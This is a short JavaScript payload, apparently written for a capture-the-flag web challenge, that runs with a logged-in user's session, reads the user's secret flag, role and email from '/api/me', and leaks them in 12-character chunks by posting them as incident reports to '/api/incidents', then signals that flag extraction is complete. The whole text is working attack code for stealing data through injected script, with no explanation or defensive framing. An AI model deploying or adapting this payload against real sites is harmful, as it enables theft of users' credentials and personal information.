(async () => {
    const data = await fetch('/api/me', {
        credentials: 'same-origin'
    }).then(r => r.json());

    const u = data.user;
    const flag = u.flag;

    if (!flag) return;

    const send = async title => {
        return fetch('/api/incidents', {
            method: 'POST',
            credentials: 'same-origin',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                title,
                facility: 'Meridian-2',
                severity: 'Watch'
            })
        }).then(r => r.json());
    };

    await send(`DEVCTX:${u.role}:${u.email}:LEN:${flag.length}`);

    for (let i = 0; i < flag.length; i += 12) {
        const part = String(i / 12 + 1).padStart(2, '0');

        await send(
            `DEVFLAGPART-${part}: ${flag.slice(i, i + 12)}`
        );
    }

    self.postMessage({
        type: 'progress',
        message: 'DEVELOPER_FLAG_EXTRACTION_COMPLETE'
    });
})();
